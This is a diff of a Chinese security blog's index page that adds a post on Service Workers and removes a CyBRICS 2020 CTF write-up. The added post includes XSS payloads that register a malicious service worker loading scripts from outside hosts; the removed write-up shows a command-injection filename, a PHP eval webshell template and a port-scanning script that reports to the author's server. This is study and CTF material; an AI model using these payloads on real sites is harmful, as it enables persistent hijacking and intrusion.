@@ -66,6 +66,176 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Service Worker" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/10/15/Service%20Worker/" class="article-date">
+  <time class="dt-published" datetime="2020-10-15T14:26:21.294Z" itemprop="datePublished">2020-10-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/10/15/Service%20Worker/">Service Worker</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h1><h2 id="Service-Worker-学习"><a href="#Service-Worker-学习" class="headerlink" title="Service Worker 学习"></a>Service Worker 学习</h2><h3 id="配置检查"><a href="#配置检查" class="headerlink" title="配置检查"></a>配置检查</h3><p>在已经支持 serivce workers 的浏览器的版本中，很多特性没有默认开启。如果你发现示例代码在当前版本的浏览器中怎么样都无法正常运行，你可能需要开启一下浏览器的相关配置：</p>
+<ul>
+<li><strong>Firefox Nightly</strong>: 访问 <code>about:config</code> 并设置 <code>dom.serviceWorkers.enabled</code> 的值为 true; 重启浏览器；</li>
+<li><strong>Chrome Canary</strong>: 访问 <code>chrome://flags</code> 并开启 <code>experimental-web-platform-features</code>; 重启浏览器 (注意：有些特性在Chrome中没有默认开放支持)；</li>
+<li><strong>Opera</strong>: 访问 <code>opera://flags</code> 并开启<code>ServiceWorker 的支持</code>; 重启浏览器。 </li>
+</ul>
+<p>另外，你需要通过 HTTPS 来访问你的页面 — 出于安全原因，<strong>Service Workers 要求必须在 HTTPS 下才能运行。Github 是个用来测试的好地方，因为它就支持HTTPS。为了便于本地开发，<code>localhost</code> 也被浏览器认为是安全源。</strong></p>
+<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ol>
+<li>Service Workers 要求必须在 HTTPS 或者 localhost 下才能运行</li>
+<li>Service Workers 要求尽可能的异步操作</li>
+</ol>
+<h3 id="Service-Workers-的注册及安装"><a href="#Service-Workers-的注册及安装" class="headerlink" title="Service Workers 的注册及安装"></a>Service Workers 的注册及安装</h3><p>通过<code>serviceWorkerContainer.register()</code>来注册一个Service Workers</p>
+<p>eg.</p>
+<pre><code class="javascript">if (&#39;serviceWorker&#39; in navigator) {
+  navigator.serviceWorker.register(&#39;/sw-test/sw.js&#39;, { scope: &#39;/sw-test/&#39; }).then(function(reg) {
+    // registration worked
+    console.log(&#39;Registration succeeded. Scope is &#39; + reg.scope);
+  }).catch(function(error) {
+    // registration failed
+    console.log(&#39;Registration failed with &#39; + error);
+  });
+}</code></pre>
+<p>其中scope为Service Workers的作用域，默认是scriptURL(<code>/sw-test/sw.js</code>)所在的文件夹及其子文件夹，scope的选择范围只能是scriptURL所在的文件夹或者子文件夹，且不能影响其他网站，只能影响当前的域名。</p>
+<p>scriptURL是相对于origin的URL而不是相对于引用他的那个JS文件，当然也有例外（ <code>Content-Type</code> 必须是 <code>text/javascript</code>）</p>
+<blockquote>
+<p>如果你的 service worker 被激活在一个有 <code>Service-Worker-Allowed</code> header 的客户端，你可以为service worker 指定一个最大的 scope 的列表。</p>
+</blockquote>
+<p>安装过程：</p>
+<p><img src="https://mdn.mozillademos.org/files/12636/sw-lifecycle.png" alt="image1495"></p>
+<h3 id="处理事件"><a href="#处理事件" class="headerlink" title="处理事件"></a>处理事件</h3><p>Service Workers支持的事件如下</p>
+<p><img src="https://mdn.mozillademos.org/files/12632/sw-events.png" alt="image1602"></p>
+<p>install:安装时会触发InstallEvent</p>
+<p>activate:安装事件之后调用activate事件</p>
+<p>fetch:Service Workers 中的所有请求都会触发fetch事件</p>
+<p>sync:当发起一个同步请求是会触发sync事件</p>
+<pre><code class="javascript">this.addEventListener(&#39;install&#39;, function(event) {
+  event.waitUntil(
+    caches.open(&#39;v1&#39;).then(function(cache) {
+      return cache.addAll([
+        &#39;/sw-test/&#39;,
+        &#39;/sw-test/index.html&#39;,
+        &#39;/sw-test/style.css&#39;,
+        &#39;/sw-test/app.js&#39;,
+        &#39;/sw-test/image-list.js&#39;,
+        &#39;/sw-test/star-wars-logo.jpg&#39;,
+        &#39;/sw-test/gallery/&#39;,
+        &#39;/sw-test/gallery/bountyHunters.jpg&#39;,
+        &#39;/sw-test/gallery/myLittleVader.jpg&#39;,
+        &#39;/sw-test/gallery/snowTroopers.jpg&#39;
+      ]);
+    })
+  );
+});
+
+self.addEventListener(&#39;activate&#39;, function(event) {
+  var cacheWhitelist = [&#39;v2&#39;];
+
+  event.waitUntil(
+    caches.keys().then(function(keyList) {
+      return Promise.all(keyList.map(function(key) {
+        if (cacheWhitelist.indexOf(key) === -1) {
+          return caches.delete(key);
+        }
+      }));
+    })
+  );
+});
+
+self.addEventListener(&#39;fetch&#39;, function(event) {
+  event.respondWith(
+    caches.match(event.request).then(function(resp) {
+      return resp || fetch(event.request).then(function(response) {
+        return caches.open(&#39;v1&#39;).then(function(cache) {
+          cache.put(event.request, response.clone());
+          return response;
+        });  
+      });
+    })
+  );
+});</code></pre>
+<h2 id="Service-Worker-With-XSS"><a href="#Service-Worker-With-XSS" class="headerlink" title="Service Worker With XSS"></a>Service Worker With XSS</h2><h3 id="XSS简单示范"><a href="#XSS简单示范" class="headerlink" title="XSS简单示范"></a>XSS简单示范</h3><p>通过Service Worker 可以持久的控制受害者</p>
+<p>利用条件如下：</p>
+<ol>
+<li>一个xss点</li>
+<li>MIME TYPE 为 application/javascript的可控页面（通常是jsonp）</li>
+</ol>
+<p><code>index.php?xss=navigator.serviceWorker.register(&quot;/sw/jsonp.php?xss=importScripts(%27https://serviceworker.free.beeceptor.com/exp.js%27);&quot;);</code></p>
+<p>exp.js</p>
+<pre><code>self.addEventListener(&#39;fetch&#39;, function(event) {
+  event.respondWith(new Response(&#39;&lt;h1 style=&quot;color:red&quot;&gt;HACKED&lt;/h1&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));
+});</code></pre><h3 id="利用Service-Workers-控制主站及其子站点"><a href="#利用Service-Workers-控制主站及其子站点" class="headerlink" title="利用Service Workers 控制主站及其子站点"></a>利用Service Workers 控制主站及其子站点</h3><p>假设在A.evil.com上存在XSS点，B.evil.com上存在可控jsonp，</p>
+<p>那么我们可以通过设置<code>document.domain=&quot;evil.com&quot;</code>，嵌入一个iframe（src=B.evil.com），然后执行恶意代码插入Service Workers</p>
+<p>A站点执行(使用self.skipWaiting()使的Service Workes 控制当前界面)</p>
+<pre><code class="javascript">document.domain=&quot;evil.com&quot;;
+a=document.createElement(&quot;iframe&quot;);
+a.src=&quot;https://B.evil.com/&quot;;
+document.body.append(a);
+document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})
+function fuck(){
+    var code = `navigator.serviceWorker.register(&quot;/jsonp.php?callback=self.importScripts(&#39;//mysite.com/fuck.js&#39;)//&quot;)`;
+    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);
+}
+</code></pre>
+<p>这样我们便控制住了B站点</p>
+<p>fuck.js</p>
+<pre><code class="javascript">document.domain=&quot;hardxss.xhlj.wetolink.com&quot;;
+a=document.createElement(&quot;iframe&quot;);
+a.src=&quot;https://auth.hardxss.xhlj.wetolink.com&quot;;
+document.body.append(a);
+document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})
+function fuck(){
+    var code = `navigator.serviceWorker.register(&quot;/api/loginStatus?callback=self.importScripts(&#39;//serviceworker.free.beeceptor.com/exp.js&#39;);//&quot;)`;
+    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);
+}
+</code></pre>
+<p>exp.js</p>
+<pre><code>self.addEventListener(&#39;fetch&#39;, function(event) {
+  event.respondWith(new Response(&#39;&lt;h1 style=&quot;color:red&quot;&gt;HACKED&lt;/h1&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));
+});
+
+</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>教程：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p>
+<p>API：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/10/15/Service">http://blog.ccreater.top/2020/10/15/Service</a> Worker/](<a href="http://blog.ccreater.top/2020/10/15/Service">http://blog.ccreater.top/2020/10/15/Service</a> Worker/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/10/15/Service%20Worker/" data-id="ckgax2liq0000zkvddwnd0ibu" data-title="Service Worker" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-FastJson1.2.24调试记录_复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" class="article-date">
@@ -3192,192 +3362,6 @@ namespace {
 
 
   
-    <article id="post-CyBRICS2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/07/29/CyBRICS2020/" class="article-date">
-  <time class="dt-published" datetime="2020-07-29T04:55:37.052Z" itemprop="datePublished">2020-07-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/07/29/CyBRICS2020/">CyBRICS2020</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="CyBRICS-2020"><a href="#CyBRICS-2020" class="headerlink" title="CyBRICS  2020"></a>CyBRICS  2020</h1><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>用burp修改返回包</p>
-<p>flag:<code>cybrics{Th0se_c4p7ch4s_c4n_hunter2_my_hunter2ing_hunter2}</code></p>
-<h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>源代码已上传</p>
-<pre><code>if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#39;\&quot;\=\$\(\)\|]*$&quot;, file.filename)):
-    exit()
-...
-def allowed_file(filename):
-    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS
-allowed_file(file.filename)
-...
-command = subprocess.Popen(f&quot;ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;, shell=True)</code></pre><p><code>filename=&quot;&#39;$(sleep 5)&#39;a.gif&quot;</code>来执行命令</p>
-<p>cybrics{imagesaresocoolicandrawonthem}</p>
-<h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200726002857.png" alt="image631"></p>
-<p>calc.php</p>
-<pre><code class="php=">if (!preg_match(&#39;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#39;, $field)) {
-        $value = &quot;BAD&quot;;
-    }else{
-    $value = eval(&quot;return $field;&quot;);
-}</code></pre>
-<pre><code>9999999999999999999:1.0E+25
-1/0:INF
-0/0:NAN
-log(0):-INF</code></pre><p>newtemplate.php</p>
-<pre><code class="php=">        if (strpos($html, &#39;&lt;?&#39;) !== false) {
-            $error = &quot;Bad chars&quot;;
-            break;
-        }
-        ...
-        file_put_contents(&quot;calcs/$userid/templates/$uuid.html&quot;, $html);</code></pre>
-<p>calc.php</p>
-<pre><code class="php=">file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));</code></pre>
-<p>html转php处，利用<code>/*</code>破坏结构，<code>file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;))</code>处<code>*/</code>收尾，于是绕过成功</p>
-<p>新建template:</p>
-<pre><code>*/)).eval($_POST[1])?&gt;
-$requiredBlocks = [
-            &#39;id=&quot;back&quot;&#39;,
-            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,
-            &#39;id=&quot;digit0&quot;&#39;,
-            &#39;id=&quot;digit1&quot;&#39;,
-            &#39;id=&quot;digit2&quot;&#39;,
-            &#39;id=&quot;digit3&quot;&#39;,
-            &#39;id=&quot;digit4&quot;&#39;,
-            &#39;id=&quot;digit5&quot;&#39;,
-            &#39;id=&quot;digit6&quot;&#39;,
-            &#39;id=&quot;digit7&quot;&#39;,
-            &#39;id=&quot;digit8&quot;&#39;,
-            &#39;id=&quot;digit9&quot;&#39;,
-            &#39;id=&quot;plus&quot;&#39;,
-            &#39;id=&quot;equals&quot;&#39;,
-        ];</code></pre><p>向calc post:<br><code>field=1/*&amp;share=1</code></p>
-<p>flag:cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}</p>
-<h2 id="Developer’s-Laptop"><a href="#Developer’s-Laptop" class="headerlink" title="Developer’s Laptop"></a>Developer’s Laptop</h2><p>看题目样子是xss题?SSRF?</p>
-<p>浏览器信息：HeadlessChrome/79.0.3945.79 </p>
-<p>填写脚本：</p>
-<pre><code class="javascript=">a=document.getElementsByClassName(&quot;form-control&quot;);a[1].value=&quot;WQLSaidXUtQAfD6ptJc7Yg&quot;;a[0].value=&quot;http://ccreater.top:60000&quot;;</code></pre>
-<p>返回包</p>
-<pre><code>HEAD / HTTP/1.1
-Host: ccreater.top:60000
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.79 Safari/537.36
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: keep-alive
-Access-Control-Request-Method: POST
-Origin: prod.free-design-feedback-cybrics2020.ctf.su
-Referer: http://prod.free-design-feedback-cybrics2020.ctf.su
-</code></pre><p>等等开发人员的电脑？肯定一堆服务，内网扫描！</p>
-<p>http服务扫描：</p>
-<pre><code class="htmlmixed=">&lt;html&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;/head&gt;
-&lt;body&gt;
-
-&lt;script&gt;
-var from = 1;
-var complete = true;
-var clear = false;
-function check(text){
-    var linkEl = document.head.querySelector(&#39;link[href*=&quot;&#39;+text+&#39;&quot;&#39;);
-    var cssLoaded = Boolean(linkEl.sheet);
-    linkEl.addEventListener(&#39;load&#39;, function () {
-        console.log(text)
-        // log
-        fetch(&quot;http://ccreater.top:60010/log.php?log=&quot;+text)
-            .then(r=&gt;r.text())
-            .then(d=&gt;{console.log(&quot;log success&quot;)})
-        // log end
-    });
-}
-function clearstyle(clear_from ,clear_to){
-    clear = true;
-    console.log(&quot;clear task start&quot;);
-    while(clear_to&lt;=clear_from){
-            document.head.querySelector(&#39;link[href$=&quot;:&#39;+clear_to+&#39;&quot;&#39;).remove();
-            clear_to++;
-    }
-    clear = false;
-    console.log(&quot;clear task end&quot;);
-}
-function make(text){
-    head = document.getElementsByTagName(&#39;head&#39;)[0];
-    var port = text;
-    var url = &quot;http://127.0.0.1:&quot;+port,
-    link = document.createElement(&#39;link&#39;);
-    link.rel = &quot;stylesheet&quot;;
-    link.href = url;
-    head.appendChild(link);
-    check(text);
-}
-async function scan(){
-    var to = from + 80 &gt; 65535 ? 65535 : from + 80;
-    for(var i=from;i&lt;to;i++){
-        make(String(i));
-    }
-    from +=80;
-    setTimeout(()=&gt;{clearstyle(from,to);},5000);
-};
-
-async function listener (){
-    console.log(&quot;listener works,from:&quot;+from+&quot;,complete:&quot;+complete);
-    if(from &lt; 65535){
-        setTimeout(listener,5000);
-        if(complete &amp;&amp; !clear){
-            console.log(&quot;new task!&quot;);
-            scan()
-                .then(()=&gt;{complete = true;})
-            complete = false;
-        }
-    }
-
-}
-listener()
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>虽然我猜到了有内网服务但是到最后我还是没有扫到。。</p>
-<p>脚本在本地是可以跑的，但是服务器上就不行，可能是因为有时间限制吧，遗憾。</p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/07/29/CyBRICS2020/">http://blog.ccreater.top/2020/07/29/CyBRICS2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/07/29/CyBRICS2020/" data-id="ckd6wbuc50000x4v05bg26sz7" data-title="CyBRICS2020" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -3403,7 +3387,7 @@ listener()
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
     </div>
   </div>
 
@@ -3413,7 +3397,7 @@ listener()
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 12px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/java/" style="font-size: 12px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16px;">web</a> <a href="/tags/wp/" style="font-size: 18px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 14px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 12px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a 